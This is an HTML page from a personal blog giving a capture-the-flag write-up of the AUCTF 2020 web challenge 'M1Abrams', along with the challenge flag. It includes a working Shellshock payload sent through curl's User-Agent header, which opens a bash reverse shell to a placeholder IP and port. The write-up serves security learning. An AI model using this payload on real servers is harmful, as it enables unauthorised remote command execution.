@@ -1,0 +1,96 @@
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <meta charset="utf-8" />
+        <meta http-equiv="X-UA-Compatible" content="chrome=1" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link href="../css/terminal.css" rel="stylesheet" type="text/css" />
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+        <script src="../js/terminal-effect.js"></script>
+        <title>Web - M1Abrams</title>
+    </head>
+    <body style="background-color: #444;">
+        <nav class="navbar navbar-expand-lg navbar-dark" style="background-color: black;">
+            <a class="navbar-brand" href="#">Worty's blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarColor02" aria-controls="navbarColor02" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+              </button>
+            
+              <div class="collapse navbar-collapse" id="navbarColor02">
+                <ul class="navbar-nav mr-auto cen">
+                  <li class="nav-item active">
+                    <a class="nav-link" href="/Graphic/index.html">Home</a>
+                  </li>
+                  <li class="nav-item">
+                    <a class="nav-link" href="/Graphic/write-ups.html">Write ups</a>
+                  </li>
+                  <li class="nav-item">
+                    <a class="nav-link" href="/Graphic/cheatsheets.html">Cheatsheets</a>
+                  </li>
+                  <li class="nav-item">
+                      <a class="nav-link" href="/Terminal/index.html">Terminal version</a>
+                  </li>
+                  <li class="nav-item">
+                    <a class="nav-link" target="_blank" href="https://twitter.com/WortySTO">Twitter</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" target="_blank" href="https://www.root-me.org/Worty">Root Me</a>
+                </li>
+                </ul>
+              </div>
+            </nav>
+            <ol class="breadcrumb">
+                <li><a href="../../write-ups.html" title="Write ups">Write Ups</a></li>
+                <h1 style="margin-left:20px;"></h1>
+                <li><a href="../../auctf2020.html" title="AUCTF - 2020">AUCTF - 2020</a></li>
+                <h1 style="margin-left:20px;"></h1>
+                <li><a href="../web.html" title="Web">Web</a></li>
+                <h1 style="margin-left:20px;"></h1>
+                <li class="active">M1Abrams</li>
+            </ol>
+        <div class="row d-flex" >
+          <div class="d-flex flex-column" ></div>
+            <div class="jumbotron w-100 text-center" style="background-color: #444;">
+              <h1 class="display-2" style="color: white;">AUCTF 2020 - Web - M1Abrams</h1>
+              <hr class="my-2">
+              <p class="lead" style="color: white;">
+                ---------------------------------------------------------------------------------------------------<br>
+                M1Abrams<br>
+                We built up this server, and our security team seems pretty mad about it. See if you can find out why.<br>
+                ---------------------------------------------------------------------------------------------------<br>
+            </p>
+            <p class="lead" style="color: white;">
+                Arriving on this site, we notice that we have the basic index.html of Apache2. <br>
+                We do a dirb on this site, we see that everything is in 403, except index.html.<br>
+
+                So we try to look at the source code, we notice, that in HTML comment, there is a link that refers to a bug in Apache that is linked to a CVE (CVE-2016-4979). Unfortunately, this CVE applies to the Apache2 server < 2.24.20, but our version is 2.24.29.<br><br></2.24.20>
+
+                So we keep looking, and the only possible flaw with the results we get is in /cgi-bin/, exploiting the shellshock vulnerability.<br>
+                This vulnerability consists in exploiting a script to execute bash commands as a www-data user (uid: 33).<br>
+
+                So we decide to bruteforce with the big.txt wordlist of dirb. After a few minutes, we boot a file in /cgi-bin/ : scriptlet.<br>
+
+                So we connect to /cgi-bin/scriptlet, which sends us back :<br><br>
+
+                uid=33(www-data) gid=33(www-data) groups=33(www-data)<br><br>
+
+
+                So we exploit the shellshock vulnerability to launch a reverse shell with the curl command :<br><br>
+
+                curl -A '() { :; };echo;echo;bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' http://challenges.auctf.com:30024/cgi-bin/scriptlet<br><br>
+
+                From our pc, we connect with the netcat command : nc challenges.auctf.com <PORT><br>
+
+                We list the different folders, in /, we notice a flag.file.<br>
+                This file is encoded, but, when we string it, we see that there is a flag.txt file in it.<br>
+                So we download the flag.file thanks to the shellshock vulnerability.<br><br>
+
+                We make a file command on this file, it's a gz archive!<br>
+                So we change the name of the file, Because gz cannot decompress a file if it doesn't have a .gz extension: mv temp temp.gz<br><br>
+
+                Gunzip it : gzip -d temp.gz.<br>
+                We recover a file name temp, which is ascii, we display it, we get the flag: auctf{$h311_Sh0K_m3_z@ddY}.
+            </p>
+        </div>
+    </body>
+</html>
